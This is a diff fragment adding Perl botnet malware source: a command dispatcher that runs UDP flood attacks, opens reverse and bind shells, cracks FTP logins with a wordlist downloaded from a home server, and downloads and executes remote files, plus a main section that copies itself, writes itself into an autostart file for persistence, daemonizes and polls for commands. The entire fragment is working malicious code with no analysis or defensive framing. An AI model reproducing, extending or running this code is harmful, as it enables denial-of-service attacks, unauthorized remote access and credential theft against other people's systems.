+	} elsif ($token[0] =~ /^$udpstorm/){
+		SendMyMessage("UDP+Storm...");
+	$target = $token[1]; $targ_port = $token[2];
+	$ddos_time = $token[3]; $delay_time = $token[4];
+	udpflood($target, $targ_port, $ddos_time, $delay_time);
+	SendMyMessage("Done!");
+	} elsif ($token[0] =~ /^$revsh/){
+		SendMyMessage("Reverse+Shell");
+	$rev_host = $token[1]; $rev_port = $token[2];
+	my $pido = fork();
+	if($pido == 0){
+	RemShell($rev_host, $rev_port);
+	exit(0);
+	} else {
+		waitpid($pido,0);
+		}
+		SendMyMessage("Done!");
+	} elsif ($token[0] =~ /^$remterm/){
+	$my_port = $token[1];
+		SendMyMessage("E.R.T.E");
+		my $pid = fork();
+		if($pid == 0){
+	CryShell($my_port);
+	exit(0);
+	} else {
+		waitpid($pid, 0);
+		}
+		SendMyMessage("Done!");
+	} elsif ($token[0] =~ /^$ftpcrack/){
+	$host_to_crack = $token[1]; $port_to_crack = $token[2];
+	$dictionary_file = $token[3];
+#	print "Master want to me to crack $host_to_crack:$port_to_crack with usage of $dictionary_file :D:D\n";
+		SendMyMessage("CracKing...");
+
+	my $bin = GetCommand($HOME, $HOME_PORT, $FOLDER_NAME.$dictionary_file, $USER_AGENT);
+	my $rand = gen_rand(10);
+	my $loc_path = "/tmp/".$rand.".txt";
+	open OUTF, ">$loc_path";
+	print OUTF $bin;
+	close OUTF;	
+	chmod 0777, $loc_path;
+	$status = ftp_crack($host_to_crack, $port_to_crack, $loc_path);
+	print "STATUS: ".$status."\n";
+	if($status eq "err"){
+		unlink($loc_path);
+		SendMyMessage("Error!");
+		} else {
+	unlink($loc_path);
+	my $FTP_STATUS = "ftpstatus".$status;
+	print $FTP_STATUS."\n";
+		SendMyMessage($FTP_STATUS);
+	}
+		
+		
+	} elsif ($token[0] =~ /^$dl_exec/){
+	$remote_host_ex = $token[1]; $remote_path_to_file = $token[2];
+	$local_file = $token[3];
+		SendMyMessage("Downloading..");
+	$status = DownLoadExec($remote_host_ex, $remote_path_to_file, $local_file);
+	if($status eq "accden") {
+		SendMyMessage("Error!");
+		} else {
+			SendMyMessage("Done!");
+			}
+	} else {
+		SendMyMessage("Unknown+Command!");	
+	}
+}
+
+sub copy_file {
+  my ($srcfile, $destfile) = @_;
+  my $buffer;
+  open INF, $srcfile or die "\nCan't open $srcfile for reading: $!\n";
+  open OUTF, ">$destfile" or die "\nCan't open $destfile for writing: $!\n";
+  binmode INF; binmode OUTF;
+  while (read (INF, $buffer, 65536) and print OUTF $buffer ) {
+	print "Moving...\n";
+	};
+#  print "Problem copying: $!\n" if $!;
+  close OUTF or die "Can't close $destfile: $!\n";
+  close INF or die "Can't close $srcfile: $!\n";
+}
+
+
+#############################################################################
+# >> Main section <<
+#############################################################################
+
+my $int = int(0); # left ...
+my $b0t = GenBotName($BASE_NAME); # this is the part when generate random string to add to bot name
+$machine = __FILE__;	# this our current script name
+$hybrid = $LOCAL_DIR.$machine;	# left ...
+$dest = $LOCAL_DIR.$b0t;	# complete bot path + name
+open(FILE, $AUTOSTART_FILE);	# open autostart file
+if (grep{/$machine/} <FILE>){	# if botname has been found there
+   close FILE;			# close it
+   print "Have found my self!\n";	# lalalal	
+   daemonize();			# daemonize
+   goto __INIT;			# goto main function
+}else{				# bot not found
+   print "/me not found\n";	# lalala
+   copy_file($machine, $dest);	# copy bot to its destination
+   chmod 0777, $dest;		# chmod it
+   system "echo '\n' >> $AUTOSTART_FILE";	# lalala
+   system "echo '$dest' >> $AUTOSTART_FILE";	# add bot to autostart
+   system($dest);		# run bot
+   close FILE;			# close file
+   exit();			# this exit will never happen if we are installed already
+}
+
+__INIT:				# main routine, will never happen if we are not installed
+
+while(1){			# inf loop
+sleep $DEFAULT_SLEEP_TIME;	# stay inactive for some time
+MAIN();				# run main function
+}
+
+###############################################################################
+# End of main section
+###############################################################################
